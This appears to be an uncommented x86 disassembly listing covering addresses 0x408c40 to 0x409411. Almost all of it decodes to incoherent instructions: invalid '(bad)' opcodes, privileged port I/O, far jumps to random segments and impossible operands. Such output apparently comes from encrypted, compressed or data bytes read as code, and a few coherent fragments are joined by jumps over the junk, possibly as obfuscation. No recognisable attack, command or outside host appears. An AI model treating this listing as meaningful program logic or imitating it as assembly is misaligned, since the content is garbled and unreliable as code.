  408c40:	bswap  esp
  408c42:	push   ebx
  408c43:	(bad)  
  408c44:	fstp   DWORD PTR [edx-0x1a]
  408c47:	push   ds
  408c48:	xor    esp,DWORD PTR ds:0x31c5746b
  408c4e:	sbb    DWORD PTR [esi],esp
  408c50:	and    eax,0xac21d1d8
  408c55:	std    
  408c56:	outs   dx,DWORD PTR ds:[esi]
  408c57:	loope  0x408c7e
  408c59:	fist   WORD PTR ds:0xde3875f5
  408c5f:	mov    al,ds:0x8419bf4c
  408c64:	in     eax,dx
  408c65:	sbb    al,0xd5
  408c67:	pop    edx
  408c68:	ror    ah,cl
  408c6a:	scas   al,BYTE PTR es:[edi]
  408c6b:	outs   dx,DWORD PTR ds:[esi]
  408c6c:	imul   esi,DWORD PTR [ebx+0x3cd71995],0xffffff80
  408c73:	(bad)  
  408c74:	sbb    eax,DWORD PTR [edi+0x68f0a350]
  408c7a:	pop    edx
  408c7b:	sbb    esp,DWORD PTR [edi+0x1c]
  408c7e:	jmp    0x408c66
  408c80:	jns    0x408c9d
  408c82:	sbb    eax,0x4fb6d98
  408c87:	xchg   edx,eax
  408c88:	pop    es
  408c89:	mov    esp,0x489c140a
  408c8e:	pop    esp
  408c8f:	jg     0x408cfc
  408c91:	ss jbe 0x408c79
  408c94:	jecxz  0x408ccb
  408c96:	and    BYTE PTR [ebp+0x79],0x80
  408c9a:	data16 not BYTE PTR [eax+edx*2]
  408c9e:	xor    cl,bl
  408ca0:	push   0xffffffb4
  408ca2:	dec    esp
  408ca3:	jl     0x408c98
  408ca5:	pop    ds
  408ca6:	jle    0x408c40
  408ca8:	add    ch,dh
  408caa:	lds    ebx,FWORD PTR [ecx]
  408cac:	popf   
  408cad:	(bad)  
  408caf:	mov    ebp,0xa81a58ec
  408cb4:	dec    esi
  408cb5:	aam    0x78
  408cb7:	xor    DWORD PTR [ebp+0x4a2c3982],esp
  408cbd:	mov    al,ds:0x8ee27f39
  408cc2:	mov    gs,esp
  408cc4:	inc    ecx
  408cc5:	and    DWORD PTR [ecx+0x63],0xffffffa7
  408cc9:	mov    eax,ds:0x988888e3
  408cce:	mov    cl,0x3c
  408cd0:	mov    dh,0xa7
  408cd2:	inc    esp
  408cd3:	out    dx,eax
  408cd4:	and    DWORD PTR [edi+0x75],0xffffffd1
  408cd8:	int3   
  408cd9:	cmp    edi,0xffffffaa
  408cdc:	mov    ebp,DWORD PTR [ebx-0x5a]
  408cdf:	or     edi,eax
  408ce1:	cli    
  408ce2:	stos   BYTE PTR es:[edi],al
  408ce3:	adc    eax,0x554a0c94
  408ce8:	mov    cs:0xdf523344,eax
  408cee:	in     al,dx
  408cef:	scas   al,BYTE PTR es:[edi]
  408cf0:	add    BYTE PTR [edx],0xa6
  408cf3:	in     al,0x75
  408cf5:	xchg   BYTE PTR es:[edi-0x32687e17],dl
  408cfc:	icebp  
  408cfd:	pop    DWORD PTR ds:0xce2e0c8a
  408d03:	in     al,dx
  408d04:	or     al,0x5
  408d06:	outs   dx,BYTE PTR ds:[esi]
  408d07:	push   eax
  408d08:	pop    ecx
  408d09:	fisubr DWORD PTR [edi]
  408d0b:	jp     0x408cc3
  408d0d:	inc    esi
  408d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d0f:	push   ebx
  408d10:	mov    ds:0x9ef02692,al
  408d15:	mov    eax,0x4bfb2c3
  408d1a:	jnp    0x408d95
  408d1c:	mov    ebx,DWORD PTR [ecx+0x15]
  408d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d20:	(bad)
  408d24:	or     al,0xa2
  408d26:	jmp    0x218c:0x1d47aef2
  408d2d:	cmp    BYTE PTR [ebp+0x7e0f3110],bl
  408d33:	lds    eax,FWORD PTR [ebx-0x20]
  408d36:	pop    esi
  408d37:	adc    bh,BYTE PTR ds:0xe6d15f68
  408d3d:	arpl   WORD PTR [esi+ecx*4],cx
  408d40:	fwait
  408d41:	jbe    0x408d42
  408d43:	repnz aaa 
  408d45:	in     eax,dx
  408d46:	int3   
  408d47:	push   ss
  408d48:	ret    0x5060
  408d4b:	daa    
  408d4c:	dec    edx
  408d4d:	(bad)  
  408d4e:	cmp    eax,0xc6a1b2c0
  408d53:	dec    edi
  408d54:	pop    ebx
  408d55:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  408d57:	out    0xfd,al
  408d59:	sbb    esi,ebx
  408d5b:	iret   
  408d5c:	fs out 0x86,al
  408d5f:	xchg   esp,eax
  408d60:	jle    0x408d53
  408d62:	fmul   DWORD PTR ds:0x89884438
  408d68:	shl    BYTE PTR [ecx-0x28],cl
  408d6b:	mov    ecx,ebp
  408d6d:	(bad)  
  408d6e:	test   eax,0x2abda012
  408d73:	mov    esi,0x8633bc3f
  408d78:	ficomp WORD PTR [edx-0x1e8977fb]
  408d7e:	in     al,dx
  408d7f:	pop    edi
  408d80:	sbb    ch,BYTE PTR [esi+0x67]
  408d83:	xor    edi,DWORD PTR [esi+0x5b3b9b3]
  408d89:	jno    0x408d93
  408d8b:	mov    esi,eax
  408d8d:	mov    dl,0xb4
  408d8f:	in     eax,dx
  408d90:	cmp    ecx,DWORD PTR [esi+0x20]
  408d93:	aaa    
  408d94:	mov    edx,0xc8d5e3a7
  408d99:	sub    eax,0x64bfbd75
  408d9e:	call   0xc1ef77b5
  408da3:	stc    
  408da4:	push   es
  408da5:	cmp    al,0x26
  408da7:	pop    edi
  408da8:	jae    0x408d78
  408daa:	sub    esp,DWORD PTR [edi+0x5232c97c]
  408db0:	sbb    BYTE PTR [edx-0x6c],ah
  408db3:	pop    esp
  408db5:	push   esi
  408db6:	cwde   
  408db7:	xor    DWORD PTR [edi-0x22150491],ebx
  408dbd:	adc    DWORD PTR [edi],eax
  408dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dc0:	clc    
  408dc1:	jl     0x408dfc
  408dc3:	pop    eax
  408dc4:	in     al,dx
  408dc5:	int3   
  408dc6:	call   0xe4b077f7
  408dcb:	sbb    BYTE PTR [ebx+0x6831dce7],ch
  408dd1:	pop    ds
  408dd2:	je     0x408e28
  408dd4:	scas   eax,DWORD PTR es:[edi]
  408dd5:	hlt    
  408dd6:	aam    0xf7
  408dd8:	retf   
  408dd9:	pop    ecx
  408dda:	je     0x408d86
  408ddc:	mov    ecx,ebp
  408dde:	push   0xffffffa0
  408de0:	jmp    0x28eff959
  408de5:	dec    ebp
  408de6:	into   
  408de7:	jp     0x408e56
  408de9:	arpl   di,sp
  408deb:	shr    DWORD PTR [esi+0x31],cl
  408dee:	das    
  408def:	aas    
  408df0:	mov    bl,0xa
  408df2:	inc    edi
  408df3:	xchg   esi,eax
  408df4:	add    DWORD PTR [ebp+0x36a63cc8],esi
  408dfa:	sar    BYTE PTR [edi-0x1],0xfb
  408dfe:	loop   0x408e27
  408e00:	mov    ecx,0x1e63cb42
  408e05:	aaa    
  408e06:	inc    BYTE PTR [edi]
  408e08:	cdq    
  408e09:	sar    BYTE PTR [ebp+0x2b],1
  408e0c:	fldcw  WORD PTR [edx+0x62]
  408e0f:	ffree  st(1)
  408e11:	outs   dx,BYTE PTR ds:[esi]
  408e12:	push   ecx
  408e13:	sti    
  408e14:	mov    al,0x83
  408e16:	mov    al,0x12
  408e18:	mov    al,0x8
  408e1a:	out    0xde,al
  408e1c:	jnp    0x408de0
  408e1e:	pop    ecx
  408e1f:	pop    es
  408e20:	stos   BYTE PTR es:[edi],al
  408e21:	xchg   ebp,eax
  408e22:	mov    ecx,0x432d3ea0
  408e27:	jnp    0x408e55
  408e29:	push   ss
  408e2a:	cmp    DWORD PTR [ebp+0x5965cad1],esp
  408e30:	or     BYTE PTR [edx],bl
  408e32:	jp     0x408e66
  408e34:	fiadd  DWORD PTR [ebp+ebx*1+0x2b]
  408e38:	and    ch,ah
  408e3a:	sub    dl,bl
  408e3c:	clc    
  408e3d:	push   edi
  408e3e:	jp     0x408e86
  408e40:	(bad)  
  408e41:	shrd   eax,edx,0x2
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	and    DWORD PTR ds:0x513abc97,0x129e1818
  408e7f:	sbb    BYTE PTR [eax],bl
  408e81:	loopne 0x408eae
  408e83:	adc    bl,bh
  408e85:	mov    ds:0x81626d9,eax
  408e8a:	stc    
  408e8b:	dec    edi
  408e8c:	hlt    
  408e8d:	jmp    FWORD PTR [edx+0x20]
  408e90:	or     ch,BYTE PTR [ecx+0x7d]
  408e93:	popf   
  408e94:	out    0xb4,al
  408e96:	out    dx,eax
  408e97:	inc    esp
  408e98:	test   eax,0xc8ff157b
  408e9d:	jmp    0x6c7e653b
  408ea2:	xchg   ebx,eax
  408ea3:	pop    es
  408ea4:	xlat   BYTE PTR ds:[ebx]
  408ea5:	lea    edi,[esi]
  408ea7:	loop   0x408e2d
  408ea9:	push   es
  408eaa:	popf   
  408eab:	xchg   ebx,eax
  408eac:	bound  eax,QWORD PTR [edi-0x2b]
  408eaf:	xor    edx,DWORD PTR [edx+eax*4]
  408eb2:	pop    edi
  408eb3:	sub    al,dh
  408eb5:	jecxz  0x408f11
  408eb7:	add    esp,DWORD PTR [esi+0x78]
  408eba:	clc    
  408ebb:	mov    ch,0x38
  408ebd:	dec    ecx
  408ebe:	imul   ebx,esp,0x33176ffc
  408ec4:	lahf   
  408ec5:	mov    cl,0x42
  408ec7:	dec    edi
  408ec8:	aad    0xb5
  408eca:	div    BYTE PTR [eax]
  408ecc:	adc    eax,0xee0a93d7
  408ed1:	loop   0x408f0a
  408ed3:	xor    BYTE PTR [edx+0x71],bh
  408ed6:	popa   
  408ed7:	adc    eax,0xc0c3ab0f
  408edc:	xchg   esp,eax
  408edd:	pop    ss
  408ede:	jmp    0xf59cf612
  408ee3:	sahf   
  408ee4:	aaa    
  408ee5:	ffreep st(4)
  408ee7:	rol    BYTE PTR [ebp+0x2],0x3c
  408eeb:	or     ebp,DWORD PTR ds:0xa6a28402
  408ef1:	mov    eax,0xf69704ac
  408ef6:	pop    ecx
  408ef7:	lods   al,BYTE PTR ds:[esi]
  408ef8:	sbb    eax,0x6ca722a0
  408efd:	inc    edx
  408efe:	mov    ah,bl
  408f00:	cs mov dl,0x1d
  408f03:	(bad)  
  408f04:	push   ds
  408f05:	mov    dl,0xcf
  408f07:	and    al,BYTE PTR ds:0xb1448342
  408f0d:	or     DWORD PTR ds:0x3b38b5c3,0xc2db8af5
  408f17:	cs xchg edx,eax
  408f19:	inc    eax
  408f1a:	scas   eax,DWORD PTR es:[edi]
  408f1b:	add    eax,0xa5f4324f
  408f20:	cmp    al,0x32
  408f22:	shr    eax,cl
  408f24:	and    BYTE PTR [ebp+edx*2-0x64],0x94
  408f29:	lods   eax,DWORD PTR ds:[esi]
  408f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f2b:	or     BYTE PTR ds:0xc584e83c,dl
  408f31:	fs mov ebp,0xae8cd325
  408f37:	jns    0x408f34
  408f39:	sbb    esp,DWORD PTR [esi-0x69]
  408f3c:	shr    BYTE PTR [eax-0x31],1
  408f3f:	xor    BYTE PTR [edx+edi*4],ah
  408f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f43:	out    0xbb,eax
  408f45:	scas   al,BYTE PTR es:[edi]
  408f46:	ss (bad) 
  408f49:	ret    
  408f4a:	push   edi
  408f4b:	add    ecx,DWORD PTR [edi-0x4d0aa731]
  408f51:	xor    al,0x70
  408f53:	outs   dx,BYTE PTR ds:[esi]
  408f54:	mov    edx,0x478ffd58
  408f59:	test   ch,dh
  408f5b:	mov    DWORD PTR [ebx],eax
  408f5d:	push   ebp
  408f5e:	lods   eax,DWORD PTR es:[esi]
  408f60:	fisubr WORD PTR [edi+0x5e3c9528]
  408f66:	push   esp
  408f67:	sbb    al,bh
  408f69:	lock or eax,0x95c8f097
  408f6f:	iret   
  408f70:	xor    al,0x66
  408f72:	fisttp DWORD PTR [ecx+0x62cb33e7]
  408f78:	mov    ah,0xe4
  408f7a:	mov    esi,0xff8de1ef
  408f7f:	push   esi
  408f80:	clc    
  408f81:	mov    ch,0x28
  408f83:	sbb    ecx,edi
  408f85:	inc    ebx
  408f86:	in     eax,0x2b
  408f88:	rcl    DWORD PTR [esi+0x4ee9cc6b],1
  408f8e:	jge    0x408f79
  408f90:	pop    ebp
  408f91:	mov    ebp,0xda692121
  408f96:	cmp    edi,DWORD PTR [ebx]
  408f98:	daa    
  408f99:	stos   DWORD PTR es:[edi],eax
  408f9a:	cmp    DWORD PTR [ecx],ecx
  408f9c:	or     al,0x7e
  408f9e:	cmp    ebx,0xc896ad58
  408fa4:	pop    esi
  408fa5:	pop    ss
  408fa6:	in     eax,dx
  408fa7:	gs sbb al,0xe
  408faa:	adc    al,0xce
  408fac:	ret    0x2949
  408faf:	aad    0x19
  408fb1:	cli    
  408fb2:	push   ebx
  408fb3:	push   ecx
  408fb4:	push   esi
  408fb5:	pop    ecx
  408fb6:	xchg   dh,cl
  408fb8:	rcl    BYTE PTR [edi],0x2e
  408fbb:	sbb    eax,0xfbd3c5bf
  408fc0:	mov    dh,0x70
  408fc2:	jnp    0x408f81
  408fc4:	pop    ebx
  408fc5:	mov    ecx,0x62cae12b
  408fca:	push   DWORD PTR [ebp-0x21c7fcee]
  408fd0:	scas   al,BYTE PTR es:[edi]
  408fd1:	xchg   edx,eax
  408fd2:	ret    0x35b2
  408fd5:	or     DWORD PTR [edx-0x7e71b416],ebx
  408fdb:	jnp    0x408f7a
  408fdd:	or     eax,0x7fb61cb0
  408fe2:	jns    0x40904d
  408fe4:	sub    ebp,DWORD PTR es:0xe3c29f61
  408feb:	inc    esp
  408fec:	jns    0x409063
  408fee:	sbb    DWORD PTR [eax-0xe],0xf715983e
  408ff5:	mov    ch,0xaf
  408ff7:	push   edi
  408ff8:	and    edi,DWORD PTR [edi+0x34b07cd]
  408ffe:	push   ebp
  408fff:	mov    ch,0x81
  409001:	hlt    
  409002:	in     eax,0x29
  409004:	call   ecx
  409006:	cmp    edx,edx
  409008:	xor    DWORD PTR ds:0xcbb29a00,edi
  40900e:	retf   
  40900f:	sub    dh,BYTE PTR [ecx-0x76d197ca]
  409015:	and    bl,BYTE PTR [ecx-0x70]
  409018:	out    dx,eax
  409019:	ret    
  40901a:	jge    0x409097
  40901c:	out    0xbf,al
  40901e:	repnz popa 
  409020:	jnp    0x408fd7
  409022:	repz and eax,0x15ae6e97
  409028:	cmp    esp,DWORD PTR [ebx]
  40902a:	arpl   WORD PTR [edx+0x4c],di
  40902d:	mov    ebx,0xd2199992
  409032:	mov    esp,esp
  409034:	outs   dx,BYTE PTR ds:[esi]
  409035:	cld    
  409036:	pop    esi
  409037:	enter  0x56ec,0x64
  40903b:	lods   al,BYTE PTR ds:[esi]
  40903c:	addr16 push ecx
  40903e:	pushf  
  40903f:	inc    ebx
  409040:	jmp    0xe2e3:0xdd316620
  409047:	jnp    0x4090bc
  409049:	fiadd  DWORD PTR [edi+0x7f]
  40904c:	mov    DWORD PTR [ebp+0x39fc6d7c],ecx
  409052:	mov    ch,0x6
  409054:	and    al,cl
  409056:	pop    eax
  409057:	dec    edx
  409058:	fs loopne 0x409031
  40905b:	lods   eax,DWORD PTR ds:[esi]
  40905c:	pop    esi
  40905d:	lock pop ebp
  40905f:	sbb    eax,0xbf7b8074
  409064:	into   
  409065:	sub    BYTE PTR [eax],al
  409067:	fwait
  409068:	xchg   esp,eax
  409069:	icebp  
  40906a:	out    0x9b,al
  40906c:	popa   
  40906d:	leave  
  40906e:	and    bl,BYTE PTR [eax]
  409070:	int    0x2f
  409072:	or     ebp,esi
  409074:	inc    esi
  409075:	sbb    DWORD PTR [ebp+0x0],0xa304b6f7
  40907c:	push   esp
  40907d:	mov    WORD PTR [ebp-0x52],cs
  409080:	repz pop es
  409082:	dec    esi
  409083:	xchg   ecx,eax
  409084:	fsubr  st,st(6)
  409086:	push   esp
  409087:	outs   dx,BYTE PTR ds:[esi]
  409088:	and    DWORD PTR [edx],ebx
  40908a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40908b:	test   DWORD PTR [ecx+0x73],0x1ab32e0c
  409092:	sbb    al,0xc3
  409094:	mov    BYTE PTR [edx+eax*4-0x2dfa92f5],cl
  40909b:	jg     0x4090eb
  40909d:	out    dx,al
  40909e:	ins    BYTE PTR es:[edi],dx
  40909f:	xchg   DWORD PTR [ecx],esp
  4090a1:	sbb    edx,edx
  4090a3:	xchg   ebp,eax
  4090a4:	push   ds
  4090a5:	(bad)  
  4090a6:	cwde   
  4090a7:	adc    BYTE PTR [ecx-0x69],al
  4090aa:	loopne 0x409084
  4090ac:	mov    cl,0x63
  4090ae:	cmp    ebp,DWORD PTR [ecx+ebp*1]
  4090b1:	mov    ch,0x5f
  4090b3:	mov    ebx,0xb41988ee
  4090b8:	fidivr DWORD PTR ss:[ebx+0x1b]
  4090bc:	retf   
  4090bd:	add    cl,0xef
  4090c0:	mov    ?,WORD PTR [esi+0x42]
  4090c3:	stos   DWORD PTR es:[edi],eax
  4090c4:	test   DWORD PTR [ecx+0x1636d5a2],edx
  4090ca:	adc    esi,eax
  4090cc:	je     0x4090f9
  4090ce:	mov    ebp,0x1942dbc
  4090d3:	mov    esp,0x1995a3f5
  4090d8:	int    0x41
  4090da:	ror    DWORD PTR [esi-0x58d94084],0x49
  4090e1:	stos   DWORD PTR es:[edi],eax
  4090e2:	push   edx
  4090e3:	lea    esi,ds:0xb5b409c0
  4090e9:	mov    dl,0x9b
  4090eb:	sar    BYTE PTR [edx-0x6],0xd5
  4090ef:	mov    edx,0xc5589c0c
  4090f4:	inc    ebx
  4090f5:	jle    0x4090dd
  4090f7:	add    DWORD PTR [edx+eiz*8+0x22],0x2ba78248
  4090ff:	sbb    esi,DWORD PTR [ebp-0x339c9e28]
  409105:	mov    dh,0x13
  409107:	jb     0x40915d
  409109:	imul   esi,ecx,0xffffff97
  40910c:	(bad)  
  40910d:	push   esp
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	inc    eax
  409110:	repz cmp ebp,esp
  409113:	lods   al,BYTE PTR ds:[esi]
  409114:	inc    ebx
  409115:	mov    ebx,0x42e8c782
  40911a:	sti    
  40911b:	pusha  
  40911c:	(bad)  
  40911d:	repz inc edx
  40911f:	scas   al,BYTE PTR es:[edi]
  409120:	adc    BYTE PTR [ecx+eax*2+0x55fea874],bl
  409127:	in     al,0xeb
  409129:	jg     0x4090f9
  40912b:	xchg   edx,eax
  40912c:	sub    eax,0xa3b4b5fa
  409131:	cmp    eax,0x52e9bfdd
  409136:	ds mov bh,0x22
  409139:	and    al,0xc9
  40913b:	mov    esi,0xca4667a0
  409140:	arpl   WORD PTR [edx+ebx*8],di
  409143:	sbb    BYTE PTR [ebx+ebx*8-0x579e8aa3],dh
  40914a:	xchg   edx,eax
  40914b:	xchg   al,dl
  40914d:	push   edi
  40914e:	xor    dh,BYTE PTR [ecx]
  409150:	jmp    0xf0d9b944
  409155:	jb     0x4090da
  409157:	std    
  409158:	ds pop ebx
  40915a:	cwde   
  40915b:	ja     0x4090fd
  40915d:	js     0x409160
  40915f:	cdq    
  409160:	jbe    0x4091db
  409162:	div    BYTE PTR [edx+0x7468cda0]
  409168:	lahf   
  409169:	mov    eax,ds:0xc82a0cb9
  40916e:	xor    eax,0x716ef57a
  409173:	ret    
  409174:	scas   al,BYTE PTR es:[edi]
  409175:	aam    0xcf
  409177:	jae    0x4091eb
  409179:	pushf  
  40917a:	push   eax
  40917b:	test   eax,0xab33079f
  409180:	outs   dx,BYTE PTR ds:[esi]
  409181:	mov    ah,BYTE PTR [ebx+0x79]
  409184:	in     al,dx
  409185:	sbb    al,0x84
  409187:	in     al,dx
  409188:	loope  0x409156
  40918a:	fs into 
  40918c:	inc    esp
  40918d:	mov    ds:0xc1122dbe,eax
  409192:	push   esp
  409193:	or     al,0xf7
  409195:	mov    esp,0xbb3ce6b7
  40919a:	adc    dh,BYTE PTR [edx-0x41]
  40919d:	cmp    al,0xc
  40919f:	cmovne edi,DWORD PTR [esi]
  4091a2:	popa   
  4091a3:	mov    bl,0xfc
  4091a5:	es push es
  4091a7:	inc    ebp
  4091a8:	jge    0x4091f4
  4091aa:	(bad)  
  4091ab:	mov    ecx,0x3ef51804
  4091b0:	xor    cl,BYTE PTR [ecx+0xd60717]
  4091b6:	add    al,0xd7
  4091b8:	sbb    ch,BYTE PTR [edi]
  4091ba:	pusha  
  4091bb:	xchg   ebp,eax
  4091bc:	cmc    
  4091bd:	bound  ebp,QWORD PTR [ebx]
  4091bf:	pop    ebp
  4091c0:	in     eax,0x45
  4091c2:	push   es
  4091c3:	jl     0x409217
  4091c5:	cmp    edi,DWORD PTR [ebx]
  4091c7:	sbb    ebx,edi
  4091c9:	pop    ss
  4091ca:	call   0xac60258
  4091cf:	sbb    DWORD PTR [edi+0x5128dab4],esp
  4091d5:	fcom   QWORD PTR [esi-0x744432c6]
  4091db:	repnz mov al,ds:0xaebcb43e
  4091e1:	jbe    0x409198
  4091e3:	fst    QWORD PTR [edi-0x6a]
  4091e6:	call   0xb93d:0xdf23aa79
  4091ed:	ins    BYTE PTR es:[edi],dx
  4091ee:	popf   
  4091ef:	xchg   ebp,eax
  4091f0:	mov    ah,0x31
  4091f2:	mov    ah,0xa9
  4091f4:	rcr    DWORD PTR [esi],0x0
  4091f7:	xchg   esi,eax
  4091f8:	mov    ebp,0x120e2203
  4091fd:	repz data16 (bad) [edx]
  409201:	pop    esp
  409202:	in     al,dx
  409203:	sbb    DWORD PTR [edi+0x7416c586],ecx
  409209:	dec    edx
  40920a:	cmp    BYTE PTR [edx+0x245f045e],dl
  409210:	jbe    0x409283
  409212:	and    bh,BYTE PTR [ecx+edx*1+0xe]
  409216:	push   cs
  409217:	mov    ebp,0x3069229b
  40921c:	fcom   DWORD PTR [eax]
  40921e:	push   ebp
  40921f:	and    al,0x22
  409221:	outs   dx,DWORD PTR ds:[esi]
  409222:	adc    esi,DWORD PTR [esi]
  409224:	inc    ebp
  409225:	js     0x409256
  409227:	mov    cl,0xb9
  409229:	sbb    BYTE PTR [edx],bh
  40922b:	jns    0x40920b
  40922d:	inc    esi
  40922e:	neg    bl
  409230:	ds dec ebp
  409232:	mov    bh,0xfb
  409234:	jns    0x4091b8
  409236:	dec    ecx
  409237:	jle    0x4091dc
  409239:	jmp    0x409212
  40923b:	retf   0x69a8
  40923e:	enter  0x4ffe,0x32
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0xaf014270
  409261:	mov    al,0xc0
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [eax],bl
  40926b:	mov    esi,0xa30d3178
  409270:	sahf   
  409271:	pop    es
  409272:	jmp    0x2966:0x6945c776
  409279:	pop    ds
  40927a:	sbb    DWORD PTR [eax+0x4682abe7],ebp
  409280:	aam    0xb5
  409282:	adc    eax,0xd834a254
  409287:	ficom  WORD PTR [ecx-0xf]
  40928a:	xchg   ecx,eax
  40928b:	pop    ss
  40928c:	test   BYTE PTR [ebp+0xf5cdf9],cl
  409292:	xor    esp,DWORD PTR [edx+0x3c]
  409295:	out    0x40,eax
  409297:	mov    ebp,0x3496139f
  40929c:	(bad)  
  40929e:	aaa    
  40929f:	dec    DWORD PTR [eax-0x79]
  4092a2:	sahf   
  4092a3:	and    ch,cl
  4092a5:	jmp    0x4092a5
  4092a7:	jae    0x40923a
  4092a9:	sbb    ch,BYTE PTR [edx+0x88221bf]
  4092af:	stos   BYTE PTR es:[edi],al
  4092b0:	aas    
  4092b1:	imul   edi,ecx,0x97f7b677
  4092b7:	push   0x3312239a
  4092bc:	mov    ch,0xa7
  4092be:	xor    ebx,DWORD PTR [esi-0x6f]
  4092c1:	mov    edi,0xccd00bed
  4092c6:	pushf  
  4092c7:	es cli 
  4092c9:	cmp    eax,eax
  4092cb:	cmp    al,ah
  4092cd:	and    DWORD PTR [eax+0x3d7967f6],0x748ec704
  4092d7:	inc    ecx
  4092d8:	jmp    0x40931d
  4092da:	add    BYTE PTR [edi],0xce
  4092dd:	or     ah,al
  4092df:	gs inc edx
  4092e1:	dec    esi
  4092e2:	push   0x74f1d769
  4092e7:	ret    
  4092e8:	dec    edi
  4092e9:	jb     0x40929c
  4092eb:	(bad)  
  4092ec:	or     DWORD PTR [ebx],0xffffffff
  4092ef:	gs jg  0x4092e3
  4092f2:	jo     0x4092e1
  4092f4:	xchg   esp,eax
  4092f5:	push   esp
  4092f6:	pusha  
  4092f7:	loop   0x4092f0
  4092f9:	pop    es
  4092fa:	pop    ds
  4092fb:	push   ss
  4092fc:	lea    ebx,[ebx-0x5d]
  4092ff:	dec    ecx
  409300:	loop   0x4092a7
  409302:	cmp    DWORD PTR [esi-0xd],ebx
  409305:	into   
  409306:	mov    ds:0x9c66e73d,al
  40930b:	les    ebx,FWORD PTR [ebp+ecx*4+0x3d]
  40930f:	sbb    eax,esp
  409311:	sub    ecx,esp
  409313:	pop    ecx
  409314:	cmp    eax,0xad51d9fc
  409319:	out    0xef,eax
  40931b:	adc    eax,0x6c342c48
  409320:	inc    ecx
  409321:	xor    esi,DWORD PTR [esi]
  409323:	test   eax,0xd9241c5c
  409328:	mov    DWORD PTR [esp+ebp*8-0xf],eax
  40932c:	ficom  WORD PTR [edi]
  40932e:	sar    DWORD PTR ds:0xa3c439a1,1
  409334:	jnp    0x4092d3
  409336:	scas   eax,DWORD PTR es:[edi]
  409337:	imul   edi,DWORD PTR [ebx+0x3c3b0acf],0xffffffeb
  40933e:	xchg   bh,bh
  409340:	push   0xa83b9865
  409345:	sbb    al,0x8d
  409347:	mov    ds:0xd25fa66,al
  40934c:	add    dh,BYTE PTR [esi+0x28]
  40934f:	arpl   WORD PTR [esi-0x7],bp
  409352:	sub    eax,0x456208b8
  409357:	mov    dl,0xd5
  409359:	arpl   WORD PTR [ecx-0xb],bp
  40935c:	inc    ecx
  40935d:	mov    ah,0x5b
  40935f:	or     BYTE PTR [esi],ch
  409361:	rol    DWORD PTR [ebp-0x5bacfaeb],cl
  409367:	cdq    
  409368:	adc    DWORD PTR [esi+edx*1-0x3c],ebp
  40936c:	mov    dl,0x42
  40936e:	inc    ebp
  40936f:	cmp    al,0x1c
  409371:	xchg   BYTE PTR [esi-0x52],ch
  409374:	dec    esi
  409375:	out    0x52,eax
  409377:	sub    bl,BYTE PTR [edi]
  409379:	mov    BYTE PTR [ecx+0x1d583309],0xf2
  409380:	(bad)  
  409381:	dec    ecx
  409382:	dec    eax
  409383:	mov    dl,0xb1
  409385:	imul   eax,DWORD PTR [ebx+edi*8],0xdcc7a95
  40938c:	pusha  
  40938d:	jmp    0x409328
  40938f:	sbb    DWORD PTR [edx+0x32],ebx
  409392:	mov    fs,WORD PTR [eax]
  409394:	cmp    edx,ebx
  409396:	loope  0x4093b0
  409398:	xchg   esi,eax
  409399:	xor    al,0x87
  40939b:	retf   0x9dd8
  40939e:	fst    DWORD PTR [ebx+esi*4-0x3f40f2c6]
  4093a5:	ins    BYTE PTR es:[edi],dx
  4093a6:	retf   0xe76a
  4093a9:	popf   
  4093aa:	push   cs
  4093ab:	test   BYTE PTR [ebp+0x65],cl
  4093ae:	lods   al,BYTE PTR ds:[esi]
  4093af:	imul   edi,DWORD PTR [ebp+0x4f],0x34
  4093b3:	add    ah,cl
  4093b5:	add    al,0x20
  4093b7:	in     al,0x4f
  4093b9:	aaa    
  4093ba:	shl    ch,0xb2
  4093bd:	(bad)  ds:0xbf248c8c
  4093c3:	fimul  DWORD PTR [ebx-0x2b]
  4093c6:	hlt    
  4093c7:	xlat   BYTE PTR ds:[ebx]
  4093c8:	dec    eax
  4093c9:	mov    bl,0x12
  4093cb:	xchg   esi,eax
  4093cc:	mov    BYTE PTR [ebx-0x2c],ah
  4093cf:	pusha  
  4093d0:	call   0xab01:0x5e4416f9
  4093d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093d8:	mov    bl,0x55
  4093da:	mov    DWORD PTR [ebp-0x6042c1ec],ecx
  4093e0:	mov    al,ds:0xddf7de89
  4093e5:	pop    esi
  4093e6:	fdivr  QWORD PTR [esi+0x35]
  4093e9:	sbb    DWORD PTR [edi-0x75cff0cf],0x1df32567
  4093f3:	mov    esi,0x6a550025
  4093f8:	push   edi
  4093f9:	fiadd  DWORD PTR [ebx+0x30]
  4093fc:	dec    eax
  4093fd:	sbb    al,0xad
  4093ff:	js     0x4093aa
  409401:	nop
  409402:	mov    al,0xef
  409404:	inc    ebx
  409405:	mov    BYTE PTR [ebx*1-0x45448e38],0x32
  40940d:	jno    0x40945a
  40940f:	ins    BYTE PTR es:[edi],dx
  409410:	ret    
  409411:	je     0x4093e8
